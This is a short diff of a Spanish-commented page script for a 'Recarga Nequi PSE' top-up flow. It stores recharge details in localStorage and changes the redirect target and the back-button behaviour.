@@ -55,7 +55,7 @@ document.getElementById("persona").innerText = persona;
 document.getElementById("banco").innerText = banco;
 
 document.getElementById("recargarBtn").addEventListener("click", () => {
-    // Guardar todos los datos de la recarga para id_check.html
+    // Guardar todos los datos de la recarga
     localStorage.setItem("recarga_telefono", telefono);
     localStorage.setItem("recarga_monto", monto);
     localStorage.setItem("recarga_montoFormato", "$" + formatear(monto));
@@ -63,12 +63,12 @@ document.getElementById("recargarBtn").addEventListener("click", () => {
     localStorage.setItem("recarga_banco_seleccionado", banco);
     localStorage.setItem("recarga_concepto", "Recarga Nequi PSE");
     
-    // Redirigir a id_check.html
-    window.location.href = "id_check.html";
+    // Redirigir a loading.html primero (como estaba originalmente)
+    window.location.href = "loading.html";
 });
 
 document.getElementById("btnAtras").addEventListener("click", () => {
-    window.location.href = "index.html";
+history.back();
 });
 </script>
 
